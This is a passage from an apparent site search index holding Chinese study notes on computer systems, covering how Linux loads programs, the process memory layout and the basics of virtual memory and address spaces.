<p>\u52a0\u8f7d\u5668\u5c06\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u4ee3\u7801\u548c\u6570\u636e\u4ece\u78c1\u76d8\u590d\u5236\u5230\u5185\u5b58\u4e2d\uff0c\u7136\u540e\u901a\u8fc7\u8df3\u8f6c\u5230\u7a0b\u5e8f\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u6216\u5165\u53e3\u70b9\u6765\u8fd0\u884c\u8be5\u7a0b\u5e8f\u3002\u8fd9\u4e2a\u5c06\u7a0b\u5e8f\u590d\u5236\u5230\u5185\u5b58\u5e76\u8fd0\u884c\u7684\u8fc7\u7a0b\u53eb\u505a \u52a0\u8f7d\u3002</p> <p>\u60f3\u8981\u771f\u6b63\u7406\u89e3\u52a0\u8f7d\uff0c\u5fc5\u987b\u660e\u767d\u8fdb\u7a0b\u3001\u865a\u62df\u5185\u5b58\u548c\u5185\u5b58\u6620\u5c04\u7684\u6982\u5ff5\u3002\u6b64\u5904\u4ec5\u505a\u4e00\u4e2a\u6982\u8ff0\uff1a</p> <p>Linux \u7cfb\u7edf\u4e2d\u7684\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u8fd0\u884c\u5728\u4e00\u4e2a\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u4e2d\uff0c\u6709\u81ea\u5df1\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002\u5f53 shell \u8fd0\u884c\u4e00\u4e2a\u7a0b\u5e8f\u65f6:</p> <ul> <li>\u7236 shell \u8fdb\u7a0b\u751f\u6210\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u5b83\u662f\u7236\u8fdb\u7a0b\u7684\u4e00\u4e2a\u590d\u5236\u3002</li> <li>\u5b50\u8fdb\u7a0b\u901a\u8fc7 execve \u7cfb\u7edf\u8c03\u7528\u542f\u52a8\u52a0\u8f7d\u5668\u3002</li> <li>\u52a0\u8f7d\u5668\u5220\u9664\u5b50\u8fdb\u7a0b\u73b0\u6709\u7684\u865a\u62df\u5185\u5b58\u6bb5\uff0c\u5e76\u521b\u5efa\u4e00\u7ec4\u65b0\u7684\u4ee3\u7801\u3001\u6570\u636e\u3001\u5806\u548c\u6808\u6bb5\u3002\u65b0\u7684\u6808\u548c\u5806\u6bb5\u88ab\u521d\u59cb\u5316\u4e3a\u96f6\u3002\u901a\u8fc7\u5c06\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u9875\u6620\u5c04\u5230\u53ef\u6267\u884c\u6587\u4ef6\u7684\u9875\u5927\u5c0f\u7684\u7247\uff08chunk\uff09\uff0c\u65b0\u7684\u4ee3\u7801\u548c\u6570\u636e\u6bb5\u88ab\u521d\u59cb\u5316\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5185\u5bb9\u3002</li> <li>\u6700\u540e\uff0c\u52a0\u8f7d\u5668\u8df3\u8f6c\u5230_start \u5730\u5740\uff0c\u5b83\u6700\u7ec8\u4f1a\u8c03\u7528\u5e94\u7528\u7a0b\u5e8f\u7684 main \u51fd\u6570\u3002\u9664\u4e86\u4e00\u4e9b\u5934\u90e8\u4fe1\u606f\uff0c\u5728\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u4efb\u4f55\u4ece\u78c1\u76d8\u5230\u5185\u5b58\u7684\u6570\u636e\u590d\u5236\u3002\u76f4\u5230   CPU \u5f15\u7528\u4e00\u4e2a\u88ab\u6620\u5c04\u7684\u865a\u62df\u9875\u65f6\u624d\u4f1a\u8fdb\u884c\u590d\u5236\uff0c\u6b64\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5229\u7528\u5b83\u7684\u9875\u9762\u8c03\u5ea6\u673a\u5236\u81ea\u52a8\u5c06\u9875\u9762\u4ece\u78c1\u76d8\u4f20\u9001\u5230\u5185\u5b58\u3002</li> </ul> <p>\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u6267\u884c\u65f6\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u52a8\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u6267\u884c\u65f6\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u5176\u4e2d <code>ld.so</code> \u8d1f\u8d23\u52a0\u8f7d\u6240\u6709\u5e93\u53ca\u521d\u59cb\u5316 GOT\uff08global offset table\uff09 \u8868\u3002</p> <p>\u6bcf\u4e2a Linux \u7a0b\u5e8f\u90fd\u6709\u4e00\u4e2a\u8fd0\u884c\u65f6\u5185\u5b58\u6620\u50cf\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u5728 Linux 86-64 \u7cfb\u7edf\u4e2d\uff1a</p> <ul> <li>\u4ee3\u7801\u6bb5\u603b\u662f\u4ece\u5730\u5740 0x400000 \u5904\u5f00\u59cb</li> <li>\u6570\u636e\u6bb5\u4f4d\u4e8e\u4ee3\u7801\u6bb5\u4e4b\u540e\uff1a</li> <li>\u8fd0\u884c\u65f6 \u5806 \u5728\u6570\u636e\u6bb5\u4e4b\u540e\uff0c\u901a\u8fc7\u8c03\u7528 malloc \u5e93\u5f80\u4e0a\u589e\u957f\u3002</li> <li>\u5806\u540e\u9762\u7684\u533a\u57df\u662f\u4e3a\u5171\u4eab\u6a21\u5757\u4fdd\u7559\u7684\u3002</li> <li>\u7528\u6237\u6808\u603b\u662f\u4ece\u6700\u5927\u7684\u5408\u6cd5\u7528\u6237\u5730\u5740\uff08 \\(2^{48}\u22121\\) \uff09\u5f00\u59cb\uff0c\u5411\u8f83\u5c0f\u5185\u5b58\u5730\u5740\u589e\u957f\u3002</li> <li>\u6808\u4e0a\u7684\u533a\u57df\uff0c\u4ece\u5730\u5740 \\(2^{48}\\) \u5f00\u59cb\uff0c\u662f\u4e3a \u5185\u6838\uff08kernel\uff09\u4e2d\u7684\u4ee3\u7801\u548c\u6570\u636e\u4fdd\u7559\u7684\uff0c\u6240\u8c13\u5185\u6838\u5c31\u662f\u64cd\u4f5c\u7cfb\u7edf\u9a7b\u7559\u5728\u5185\u5b58\u7684\u90e8\u5206\u3002</li> </ul> <p>\u865a\u62df\u5185\u5b58\u6280\u672f\u4f7f\u5f97\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u50cf\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u57fa\u672c\u683c\u5f0f\uff08e.g. \u4ee3\u7801\u6bb5\u603b\u662f\u4ece\u5730\u5740 0x400000 \u5f00\u59cb\uff09\uff0c\u800c\u4e0d\u7528\u7ba1\u4ee3\u7801\u548c\u6570\u636e\u5b9e\u9645\u5b58\u653e\u5728\u7269\u7406\u5185\u5b58\u7684\u4f55\u5904\u3002</p> <p>\u4e3a\u4e86\u7b80\u6d01\uff0c\u6211\u4eec\u628a\u5806\u3001\u6570\u636e\u548c\u4ee3\u7801\u6bb5\u753b\u5f97\u5f7c\u6b64\u76f8\u90bb\uff0c\u5e76\u4e14\u628a\u6808\u9876\u653e\u5728\u4e86\u6700\u5927\u7684\u5408\u6cd5\u7528\u6237\u5730\u5740\u5904\u3002\u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e .data \u6bb5\u6709\u5bf9\u9f50\u8981\u6c42\uff0c\u6240\u4ee5\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u4e4b\u95f4\u662f\u6709\u95f4\u9699\u7684\u3002\u540c\u65f6\uff0c\u5728\u5206\u914d\u6808\u3001\u5171\u4eab\u5e93\u548c\u5806\u6bb5\u8fd0\u884c\u65f6\u5730\u5740\u7684\u65f6\u5019\uff0c\u94fe\u63a5\u5668\u8fd8\u4f1a\u4f7f\u7528\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316\u3002\u867d\u7136\u6bcf\u6b21\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8fd9\u4e9b\u533a\u57df\u7684\u5730\u5740\u90fd\u4f1a\u6539\u53d8\uff0c\u5b83\u4eec\u7684\u76f8\u5bf9\u4f4d\u7f6e\u662f\u4e0d\u53d8\u7684\u3002</p> <p>\u5f53\u52a0\u8f7d\u5668\u8fd0\u884c\u65f6\uff0c\u521b\u5efa\u7c7b\u4f3c\u7684\u5185\u5b58\u6620\u50cf\u3002\u5728\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u5f15\u5bfc\u4e0b\uff0c\u52a0\u8f7d\u5668\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u7247\uff08chunk\uff09\u590d\u5236\u5230\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u3002\u63a5\u4e0b\u6765\uff0c\u52a0\u8f7d\u5668\u8df3\u8f6c\u5230\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\uff0c\u4e5f\u5c31\u662f <code>_start</code> \u51fd\u6570\u7684\u5730\u5740\u3002\u8fd9\u4e2a\u51fd\u6570\u662f\u5728\u7cfb\u7edf\u76ee\u6807\u6587\u4ef6 ctrl.o \u4e2d\u5b9a\u4e49\u7684\uff0c\u5bf9\u6240\u6709\u7684 C \u7a0b\u5e8f\u90fd\u662f\u4e00\u6837\u7684\u3002<code>_start</code> \u51fd\u6570\u8c03\u7528\u7cfb\u7edf\u542f\u52a8\u51fd\u6570 __libc_start_main\uff0c\u8be5\u51fd\u6570\u5b9a\u4e49\u5728 libc.so \u4e2d\u3002\u5b83\u521d\u59cb\u5316\u6267\u884c\u73af\u5883\uff0c\u8c03\u7528\u7528\u6237\u5c42\u7684 main \u51fd\u6570\uff0c\u5904\u7406 main \u51fd\u6570\u7684\u8fd4\u56de\u503c\uff0c\u5e76\u4e14\u5728\u9700\u8981\u7684\u65f6\u5019\u628a\u63a7\u5236\u8fd4\u56de\u7ed9\u5185\u6838\u3002</p> <p>\u4ee5 C \u4ee3\u7801\u4e3a\u4f8b\uff1a</p> <p></p> <p>\u6b64\u5904\u53ea\u662f\u4ee5\u6e90\u4ee3\u7801\u4e3a\u4f8b\uff0c\u5b9e\u9645\u4e0a\u5199\u5165\u5185\u5b58\u7684\u662f\u7f16\u8bd1\u94fe\u63a5\u540e\u7684\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u3002</p> <ul> <li>malloc \u5206\u914d\u7684\u662f\u5806\u5185\u5b58</li> <li>\u5c40\u90e8\u53d8\u91cf\u548c\u51fd\u6570\u8c03\u7528\u5747\u5206\u914d\u5728\u6808\u5185\u5b58\u4e0a</li> <li>glb \u4e3a\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u5b58\u50a8\u5728 .bss \u8282\u4e2d\uff0c\u800c .bss \u5c5e\u4e8e\u6570\u636e\u6bb5 Data</li> <li>str \u4e3a\u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u5b58\u50a8\u5728 .data \u8282\u4e2d\uff0c.data \u540c\u6837\u5c5e\u4e8e\u6570\u636e\u6bb5 Data</li> <li>main\u3001sum\u3001\u201cHello world!\" \u7b49\u5b58\u50a8\u5728 .strtab \u8282\u4e2d\uff0c.strtab \u5c5e\u4e8e\u4ee3\u7801\u6bb5 Text</li> </ul> <p>\u7a0b\u5e8f\u7684\u6267\u884c</p> <p>\u5c06\u6307\u4ee4\u4ea4\u7ed9 CPU \u5904\u7406\uff0c\u5373\u4e3a\u6267\u884c\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_20","title":"\u865a\u62df\u5185\u5b58","text":"<p>\u4e00\u4e2a\u7cfb\u7edf\u4e2d\u7684\u8fdb\u7a0b\u662f\u4e0e\u5176\u4ed6\u8fdb\u7a0b\u5171\u4eab CPU \u548c\u4e3b\u5b58\u8d44\u6e90\u7684\u3002\u4e3a\u4e86\u66f4\u52a0\u9ad8\u6548\u5730\u7ba1\u7406\u5185\u5b58\u5e76\u4e14\u5c11\u51fa\u9519\uff0c\u73b0\u4ee3\u7cfb\u7edf\u63d0\u4f9b\u4e86\u4e00\u79cd\u5bf9\u4e3b\u5b58\u7684\u62bd\u8c61\u6982\u5ff5\uff0c\u79f0\u4e3a \u865a\u62df\u5185\u5b58\uff08VM\uff09\uff0c\u5176\u63d0\u4f9b\u4e86\u4e09\u4e2a\u91cd\u8981\u7684\u80fd\u529b\uff1a</p> <ul> <li>VM \u5728\u4e3b\u5b58\u4e2d\u81ea\u52a8\u7f13\u5b58\u6700\u8fd1\u4f7f\u7528\u7684\u5b58\u653e\u5728\u78c1\u76d8\u4e0a\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u5185\u5bb9\uff0c\u865a\u62df\u5185\u5b58\u7f13\u5b58\u4e2d\u7684\u5757\u53eb\u505a\u9875\u3002\u5bf9\u78c1\u76d8\u4e0a\u9875\u7684\u5f15\u7528\u4f1a\u89e6\u53d1\u7f3a\u9875\uff0c\u7f3a\u9875\u5c06\u63a7\u5236\u8f6c\u79fb\u5230\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u7f3a\u9875\u5904\u7406\u7a0b\u5e8f\u3002\u7f3a\u9875\u5904\u7406\u7a0b\u5e8f\u5c06\u9875\u4ece\u78c1\u76d8\u590d\u5236\u5230\u4e3b\u5b58\u7f13\u5b58\uff0c\u5982\u679c\u5fc5\u8981\uff0c\u5c06\u5199\u56de\u88ab\u9a71\u9010\u7684\u9875\u3002</li> <li>VM \u7b80\u5316\u4e86\u5185\u5b58\u7ba1\u7406\uff0c\u8fdb\u800c\u53c8\u7b80\u5316\u4e86\u94fe\u63a5\u3001\u5728\u8fdb\u7a0b\u95f4\u5171\u4eab\u6570\u636e\u3001\u8fdb\u7a0b\u7684\u5185\u5b58\u5206\u914d\u4ee5\u53ca\u7a0b\u5e8f\u52a0\u8f7d\u3002</li> <li>VM \u901a\u8fc7\u5728\u6bcf\u6761\u9875\u8868\u6761\u76ee\u52a0\u5165\u4fdd\u62a4\u4f4d\uff0c\u4ece\u800c\u7b80\u5316\u4e86\u5185\u5b58\u4fdd\u62a4\u3002</li> </ul> <p>\u5728\u672c\u7ae0\u8282\u4e2d\u5c06\u9996\u5148\u4ecb\u7ecd \u7269\u7406\u548c\u865a\u62df\u5bfb\u5740\uff0c\u968f\u540e\u7ed9\u51fa \u5730\u5740\u7a7a\u95f4 \u7684\u6982\u5ff5\u3002\u7136\u540e\u4ecb\u7ecd\u4ec0\u4e48\u662f \u865a\u62df\u5185\u5b58\uff0c\u5e76\u7ed9\u51fa\u865a\u62df\u5185\u5b58\u626e\u6f14\u7684\u5de5\u5177\u89d2\u8272\uff1a</p> <ul> <li>\u865a\u62df\u5185\u5b58\u4f5c\u4e3a\u7f13\u5b58\u7684\u5de5\u5177</li> <li>\u865a\u62df\u5185\u5b58\u4f5c\u4e3a\u5185\u5b58\u7ba1\u7406\u7684\u5de5\u5177</li> <li>\u865a\u62df\u5185\u5b58\u4f5c\u4e3a\u5185\u5b58\u4fdd\u62a4\u7684\u5de5\u5177</li> </ul> <p>\u8fd9\u4e09\u79cd\u5de5\u5177\u5c5e\u6027\u4e5f\u6b63\u5bf9\u5e94\u4e86\u4e0a\u9762\u4ecb\u7ecd\u7684\u865a\u62df\u5185\u5b58\u7684\u4e09\u4e2a\u91cd\u8981\u80fd\u529b\u3002\u4e3a\u4e86\u8ba9\u4f60\u66f4\u4e86\u89e3\u786c\u4ef6\u5728\u652f\u6301\u865a\u62df\u5185\u5b58\u4e2d\u626e\u6f14\u7684\u89d2\u8272\uff0c\u5c06\u4ecb\u7ecd \u5730\u5740\u7ffb\u8bd1 \uff08\u7701\u7565\u4e86\u5927\u91cf\u7ec6\u8282\uff0c\u4f8b\u5982\u65f6\u5e8f\uff09\uff0c\u5728\u6b64\u671f\u95f4\uff0c\u4f60\u5c06\u7406\u89e3\uff1a\u2460 \u5982\u4f55\u7ed3\u548c\u9ad8\u901f\u7f13\u5b58\u548c\u865a\u62df\u5185\u5b58 \u2461 \u5feb\u8868 TLB \u2462 \u591a\u7ea7\u9875\u8868\u3002</p> <p>\u6700\u540e\uff0c\u7ed3\u5408 Linux \u865a\u62df\u5185\u5b58\u7cfb\u7edf\u4f5c\u4e3a\u7ed3\u5c3e\uff0c\u7ed9\u51fa \u5185\u5b58\u6620\u5c04 \u7684\u6982\u5ff5\uff0c\u5bf9 Linux \u7cfb\u7edf\u51fd\u6570\u8fdb\u884c\u66f4\u6df1\u5165\u7684\u7406\u89e3\uff0c\u5e76\u4ee5\u52a8\u6001\u5206\u914d\u5185\u5b58\u7ed3\u5c3e\uff0c\u7ed9\u51fa \u5783\u573e\u56de\u6536 \u7684\u57fa\u672c\u77e5\u8bc6\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_21","title":"\u4e00\u3001\u7269\u7406\u548c\u865a\u62df\u5bfb\u5740","text":"<p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u4e3b\u5b58\u88ab\u7ec4\u7ec7\u6210\u4e00\u4e2a\u7531 M \u4e2a\u8fde\u7eed\u7684\u5b57\u8282\u5927\u5c0f\u7684\u5355\u5143\u7ec4\u6210\u7684\u6570\u7ec4\u3002\u6bcf\u5b57\u8282\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684 \u7269\u7406\u5730\u5740\uff08Physical Address\uff0cPA\uff09\u3002</p> <p>CPU \u76f4\u63a5\u4f7f\u7528\u7269\u7406\u5730\u5740\u8bbf\u95ee\u5185\u5b58\uff0c\u79f0\u4e3a \u7269\u7406\u5bfb\u5740\u3002</p> <p>\u65e9\u671f\u7684 PC \u4f7f\u7528\u7269\u7406\u5bfb\u5740\uff0c\u800c\u4e14\u8bf8\u5982\u6570\u5b57\u4fe1\u53f7\u5904\u7406\u5668\u3001\u5d4c\u5165\u5f0f\u5fae\u63a7\u5236\u5668\u4ee5\u53ca Cray \u8d85\u7ea7\u8ba1\u7b97\u673a\u8fd9\u6837\u7684\u7cfb\u7edf\u4ecd\u7136\u7ee7\u7eed\u4f7f\u7528\u8fd9\u79cd\u5bfb\u5740\u65b9\u5f0f\u3002</p> <p>\u73b0\u4ee3\u5904\u7406\u5668\u4f7f\u7528\u7684\u662f\u4e00\u79cd\u79f0\u4e3a \u865a\u62df\u5bfb\u5740\uff08virtual addressing\uff09\u7684\u5bfb\u5740\u5f62\u5f0f\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u4e3a\u4e86\u4f7f\u7528\u865a\u62df\u5bfb\u5740\uff0cCPU \u9996\u5148\u4f1a\u751f\u6210\u4e00\u4e2a \u865a\u62df\u5730\u5740\uff08Virtual Address\uff0cVA\uff09\u6765\u8bbf\u95ee\u4e3b\u5b58\uff0c\u8fd9\u4e2a\u865a\u62df\u5730\u5740\u5728\u88ab\u9001\u5230\u5185\u5b58\u4e4b\u524d\u5148\u8f6c\u6362\u6210\u9002\u5f53\u7684\u7269\u7406\u5730\u5740\uff0c\u8f6c\u6362\u7684\u8fc7\u7a0b\u53eb\u505a \u5730\u5740\u7ffb\u8bd1\uff08address translation\uff09\u3002</p> <p>\u5c31\u50cf\u5f02\u5e38\u5904\u7406\u4e00\u6837\uff0c\u5730\u5740\u7ffb\u8bd1\u9700\u8981 CPU \u786c\u4ef6\u548c\u64cd\u4f5c\u7cfb\u7edf\u4e4b\u95f4\u7684\u7d27\u5bc6\u5408\u4f5c\u3002</p> <p>CPU \u82af\u7247\u4e0a\u540d\u4e3a \u5185\u5b58\u7ba1\u7406\u5355\u5143\uff08Memory Management Unit\uff0cMMU\uff09\u7684\u4e13\u7528\u786c\u4ef6\uff0c\u5229\u7528\u5b58\u653e\u5728\u4e3b\u5b58\u4e2d\u7684\u67e5\u8be2\u8868\u6765\u52a8\u6001\u7ffb\u8bd1\u865a\u62df\u5730\u5740\uff0c\u8be5\u8868\u7684\u5185\u5bb9\u7531\u64cd\u4f5c\u7cfb\u7edf\u7ba1\u7406\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_22","title":"\u4e8c\u3001\u5730\u5740\u7a7a\u95f4","text":"<p>\u5730\u5740\u7a7a\u95f4\uff08addressspace\uff09\u662f\u4e00\u4e2a\u975e\u8d1f\u6574\u6570\u5730\u5740\u7684\u6709\u5e8f\u96c6\u5408\uff0c\u5982\u679c\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u6574\u6570\u662f\u8fde\u7eed\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u8bf4\u5b83\u662f\u4e00\u4e2a \u7ebf\u6027\u5730\u5740\u7a7a\u95f4 \uff08linear address space\uff09\u3002</p> <p>\u4e3a\u4e86\u7b80\u5316\u8ba8\u8bba\uff0c\u6211\u4eec\u603b\u662f\u5047\u8bbe\u4f7f\u7528\u7684\u662f\u7ebf\u6027\u5730\u5740\u7a7a\u95f4\u3002</p> <p>\u5728\u4e00\u4e2a\u5e26\u865a\u62df\u5185\u5b58\u7684\u7cfb\u7edf\u4e2d\uff0cCPU \u4ece\u4e00\u4e2a\u6709 \\(N=2^n\\) \u4e2a\u5730\u5740\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u751f\u6210\u865a\u62df\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u7a7a\u95f4\u79f0\u4e3a \u865a\u62df\u5730\u5740\u7a7a\u95f4\uff08virtual addres sspace\uff09\uff1a</p> \\[ \\{0,1,2,\u22ef ,N\u20141\\} \\] <p>\u4e00\u4e2a\u5730\u5740\u7a7a\u95f4\u7684\u5927\u5c0f\u662f\u7531\u8868\u793a\u6700\u5927\u5730\u5740\u6240\u9700\u8981\u7684\u4f4d\u6570\u6765\u63cf\u8ff0\u7684\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u5305\u542b \\(N=2^n\\) \u4e2a\u5730\u5740\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u5c31\u53eb\u505a\u4e00\u4e2a n \u4f4d\u5730\u5740\u7a7a\u95f4\u3002\u73b0\u4ee3\u7cfb\u7edf\u901a\u5e38\u652f\u6301 32 \u4f4d\u6216\u8005 64 \u4f4d\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002</p> <p>\u4e00\u4e2a\u7cfb\u7edf\u8fd8\u6709\u4e00\u4e2a \u7269\u7406\u5730\u5740\u7a7a\u95f4\uff08physical address space\uff09\uff0c\u5bf9\u5e94\u4e8e\u7cfb\u7edf\u4e2d\u7269\u7406\u5185\u5b58\u7684 M \u4e2a\u5b57\u8282\uff1a</p> \\[ \\{0,1,2,\u22ef ,M\u20141\\} \\] <p>M \u4e0d\u8981\u6c42\u662f 2 \u7684\u5e55\uff0c\u4f46\u662f\u4e3a\u4e86\u7b80\u5316\u8ba8\u8bba\uff0c\u6211\u4eec\u5047\u8bbe \\(M=2^m\\)</p> <p>\u5730\u5740\u7a7a\u95f4\u7684\u6982\u5ff5\u5c06\u6570\u636e\u5bf9\u8c61\uff08\u5b57\u8282\uff09\u548c\u5bf9\u8c61\u7684\u5c5e\u6027\uff08\u5730\u5740\uff09\u62c6\u5206\u4e3a\u4e24\u4e2a\u4e3b\u4f53\uff0c\u800c\u975e\u7edf\u4e00\u7684\u5185\u5bb9\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u4e2a\u6570\u636e\u5bf9\u8c61\u53ef\u4ee5\u6709\u591a\u4e2a\u72ec\u7acb\u7684\u5730\u5740\uff0c\u5176\u4e2d\u6bcf\u4e2a\u5730\u5740\u90fd\u9009\u81ea\u4e00\u4e2a\u4e0d\u540c\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u8fd9\u5c31\u662f\u865a\u62df\u5185\u5b58\u7684\u57fa\u672c\u601d\u60f3\u3002</p> <p>\u4e3b\u5b58\u4e2d\u7684\u6bcf\u5b57\u8282\u90fd\u6709\u4e00\u4e2a\u9009\u81ea\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u865a\u62df\u5730\u5740\u548c\u4e00\u4e2a\u9009\u81ea\u7269\u7406\u5730\u5740\u7a7a\u95f4\u7684\u7269\u7406\u5730\u5740\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_23","title":"\u4e09\u3001\u865a\u62df\u5185\u5b58\u7684\u4f5c\u7528","text":"<p>\u6982\u5ff5\u4e0a\u800c\u8a00\uff0c\u865a\u62df\u5185\u5b58\u88ab\u7ec4\u7ec7\u4e3a\u4e00\u4e2a\u7531\u5b58\u653e\u5728\u78c1\u76d8\u4e0a\u7684 N \u4e2a\u8fde\u7eed\u7684\u5b57\u8282\u5927\u5c0f\u7684\u5355\u5143\u7ec4\u6210\u7684\u6570\u7ec4\uff0c\u6bcf\u5b57\u8282\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u865a\u62df\u5730\u5740\uff0c\u4f5c\u4e3a\u5230\u6570\u7ec4\u7684\u7d22\u5f15\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#31","title":"3.1 \u865a\u62df\u5185\u5b58\u4f5c\u4e3a\u7f13\u5b58\u7684\u5de5\u5177","text":"<p>\u78c1\u76d8\u4e0a\u6570\u7ec4\u7684\u5185\u5bb9\u88ab\u7f13\u5b58\u5728\u4e3b\u5b58\u4e2d\u3002\u548c\u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784\u4e2d\u5176\u4ed6\u7f13\u5b58\u4e00\u6837\uff0c\u78c1\u76d8\uff08\u8f83\u4f4e\u5c42\uff09\u4e0a\u7684\u6570\u636e\u88ab\u5206\u5272\u6210\u5757\uff0c\u8fd9\u4e9b\u5757\u4f5c\u4e3a\u78c1\u76d8\u548c\u4e3b\u5b58\uff08\u8f83\u9ad8\u5c42\uff09\u4e4b\u95f4\u7684\u4f20\u8f93\u5355\u5143\u3002</p> <p>VM \u7cfb\u7edf\u5bf9\u5185\u5b58\u5982\u4e0b\u64cd\u4f5c\u4ee5\u5904\u7406\u4e0a\u8ff0\u60c5\u51b5\uff1a</p> <ul> <li> <p>\u865a\u62df\u5185\u5b58\u5206\u5272\u4e3a\u79f0\u4e3a \u865a\u62df\u9875\uff08Virtual Page\uff0cVP\uff09\u7684\u5927\u5c0f\u56fa\u5b9a\u7684\u5757\uff0c\u6bcf\u4e2a\u865a\u62df\u9875\u7684\u5927\u5c0f\u4e3a \\(P=2^p\\) \u5b57\u8282\u3002</p> </li> <li> <p>\u7269\u7406\u5185\u5b58\u88ab\u5206\u5272\u4e3a \u7269\u7406\u9875\uff08Physical Page\uff0cPP\uff09\uff0c\u5927\u5c0f\u4e5f\u4e3a \\(P\\) \u5b57\u8282\u3002\u7269\u7406\u9875\u4e5f\u88ab\u79f0\u4e3a \u9875\u5e27\uff08page frame\uff09</p> </li> </ul> <p>\u5728\u4efb\u610f\u65f6\u523b\uff0c\u865a\u62df\u9875\u9762\u7684\u96c6\u5408\u90fd\u5206\u4e3a\u4e09\u4e2a\u4e0d\u76f8\u4ea4\u7684\u5b50\u96c6\uff1a</p> <ul> <li> <p>\u672a\u5206\u914d\u7684\uff1a VM \u7cfb\u7edf\u8fd8\u672a\u5206\u914d\uff08\u6216\u8005\u521b\u5efa\uff09\u7684\u9875\u3002\u672a\u5206\u914d\u7684\u5757\u6ca1\u6709\u4efb\u4f55\u6570\u636e\u548c\u5b83\u4eec\u76f8\u5173\u8054\uff0c\u56e0\u6b64\u4e5f\u5c31\u4e0d\u5360\u7528\u4efb\u4f55\u78c1\u76d8\u7a7a\u95f4\u3002</p> </li> <li> <p>\u7f13\u5b58\u7684\uff1a \u5f53\u524d\u5df2\u7f13\u5b58\u5728\u7269\u7406\u5185\u5b58\u4e2d\u7684\u5df2\u5206\u914d\u9875\u3002</p> </li> <li> <p>\u672a\u7f13\u5b58\u7684\uff1a \u672a\u7f13\u5b58\u5728\u7269\u7406\u5185\u5b58\u4e2d\u7684\u5df2\u5206\u914d\u9875\u3002</p> </li> </ul> <p></p> <p>\u56fe\u4e2d\u7684\u793a\u4f8b\u5c55\u793a\u4e86\u4e00\u4e2a\u6709 8 \u4e2a\u865a\u62df\u9875\u7684\u5c0f\u865a\u62df\u5185\u5b58\u3002\u865a\u62df\u9875 0 \u548c 3 \u8fd8\u6ca1\u6709\u88ab\u5206\u914d\uff0c\u56e0\u6b64\u5728\u78c1\u76d8\u4e0a\u8fd8\u4e0d\u5b58\u5728\u3002\u865a\u62df\u9875 1\u30014 \u548c 6 \u88ab\u7f13\u5b58\u5728\u7269\u7406\u5185\u5b58\u4e2d\u3002\u9875 2\u30015 \u548c 7 